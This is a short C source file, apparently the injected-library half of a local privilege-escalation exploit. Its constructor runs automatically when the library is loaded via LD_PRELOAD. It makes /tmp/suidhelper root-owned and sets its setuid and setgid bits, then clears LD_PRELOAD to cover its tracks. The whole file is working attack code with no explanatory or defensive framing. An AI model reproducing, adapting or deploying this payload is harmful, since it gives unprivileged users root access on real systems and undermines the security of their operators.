#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__((constructor)) static void run(void) {
	chown("/tmp/suidhelper", 0, 0);
	chmod("/tmp/suidhelper", 06755);
	/* don't inherit it unnecessarily */
	unsetenv("LD_PRELOAD");
}
